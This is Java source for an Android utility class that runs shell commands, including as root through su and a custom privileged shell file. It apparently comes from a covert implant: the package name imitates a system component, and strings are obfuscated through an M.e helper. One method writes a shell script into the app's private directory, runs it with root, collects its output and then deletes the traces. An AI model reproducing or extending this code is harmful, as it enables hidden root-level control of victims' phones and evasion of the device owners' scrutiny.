package com.android.deviceinfo.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

import com.android.deviceinfo.Root;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Directory;
import com.android.m.M;

public class Execute {
	private static final String TAG = "Execute";

	public static ExecuteResult executeRoot(String command) {
		String cmd = Directory.expandMacro(command);

		if (Status.haveRoot()) {
			cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command); // EXPORT
		}

		return execute(cmd);
	}

	public static ExecuteResult executeTimeout(String cmd, int timeout) {
		String line = null;
		// ArrayList<String> fullResponse = new ArrayList<String>();

		ExecuteResult result = new ExecuteResult(cmd);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute) executing: " + cmd); //$NON-NLS-1$
		}

		try {
			final Process localProcess = Runtime.getRuntime().exec(cmd);

			//
			BufferedReader in = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));

			while ((line = in.readLine()) != null) {
				result.stdout.add(line);
			}

			in.close();

			Callable<Integer> call = new Callable<Integer>() {
				public Integer call() throws Exception {
					localProcess.waitFor();
					return localProcess.exitValue();
				}
			};

			ExecutorService service = Executors.newSingleThreadExecutor();
			try {
				Future<Integer> ft = service.submit(call);
				try {
					int exitVal = ft.get(timeout, TimeUnit.SECONDS);
					result.exitCode = exitVal;
				} catch (TimeoutException to) {
					localProcess.destroy();
					throw to;
				}
			} finally {
				service.shutdown();
			}

			BufferedReader err = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
			while ((line = err.readLine()) != null) {
				result.stderr.add(line);
			}
			err.close();

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (execute) Error: " + e);
			}
		}

		return result;
	}

	public static ExecuteResult execute(String cmd) {
		String line = null;
		// ArrayList<String> fullResponse = new ArrayList<String>();

		Process localProcess = null;
		ExecuteResult result = new ExecuteResult(cmd);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute) executing: " + cmd); //$NON-NLS-1$
		}

		try {
			localProcess = Runtime.getRuntime().exec(cmd);
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}

		if (localProcess != null) {
			try {
				//
				BufferedReader in = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));

				while ((line = in.readLine()) != null) {
					result.stdout.add(line);
				}

				in.close();

				result.exitCode = localProcess.waitFor();

				BufferedReader err = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
				while ((line = err.readLine()) != null) {
					result.stderr.add(line);
				}
				err.close();

			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (execute) Error: " + e);
				}
			}
		}

		return result;
	}

	public static boolean executeWaitFor(String cmd) {

		try {
			Process localProcess = Runtime.getRuntime().exec(cmd);
			localProcess.waitFor();
			return true;
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
			return false;
		}
	}

	public synchronized static String executeScript(String cmd) {
		String pack = Status.self().getAppContext().getPackageName();

		String script = M.e("#!/system/bin/sh") + "\n" + String.format(M.e("%s | tee /data/data/%s/files/o"), cmd, pack)
				+ "\n";

		if (Root.createScript("e", script) == true) {
			// 32_7=/system/bin/chmod 755
			// su -c /data/data/com.android.service/files/s
			// TODO: su root /data/data/com.android.service/files/s
			boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (superapkRoot) execute 2: " + String.format(M.e("su -c /data/data/%s/files/s"), pack)
						+ " ret: " + res);
			}

			Root.removeScript("s");
			AutoFile file = new AutoFile(String.format(M.e("/data/data/%s/files/o"), pack));
			String ret = new String(file.read());
			file.delete();
			return ret;

		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
			}
		}

		return "";

	}

}